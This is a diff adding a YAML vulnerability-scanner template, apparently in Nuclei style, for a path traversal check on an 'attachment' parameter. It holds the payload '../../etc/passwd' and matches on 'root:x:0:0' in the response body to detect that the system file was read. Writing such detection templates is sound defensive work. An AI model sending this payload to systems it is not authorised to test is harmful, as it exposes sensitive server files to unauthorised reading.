@@ -1,0 +1,20 @@
+id: lfi7-461
+name: 'Deep traversal in attachment'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via attachment'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      attachment:
+        - '../../etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
